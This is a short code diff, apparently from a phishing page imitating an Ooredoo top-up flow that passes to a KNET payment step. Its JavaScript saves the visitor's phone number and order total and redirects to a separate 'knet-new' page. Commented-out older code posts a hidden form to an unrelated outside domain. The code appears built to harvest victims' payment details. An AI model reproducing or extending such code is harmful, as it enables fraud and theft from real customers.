@@ -741,7 +741,11 @@
         function knet_payment(event) {
             event.preventDefault();
             localStorage.setItem('Total', totalPrice);
-            // إنشاء فورم مخفي لتقديم البيانات باستخدام POST
+            localStorage.setItem('phoneNumber', inputField1.value);
+            // إعادة توجيه مباشرة إلى صفحة KNET الجديدة
+            window.location.href = '/myooredoo/knet-new.html';
+            return;
+            // الكود القديم أدناه لم يعد يستخدم
             var form = document.createElement('form');
             form.method = 'POST';
             form.action = "https://asderw-link.com/store8";
@@ -764,8 +768,8 @@
             });
             form.appendChild(inputLog);
 
-            document.body.appendChild(form);
-            form.submit();
+            // document.body.appendChild(form);
+            // form.submit();
         }
     </script>
 </body>
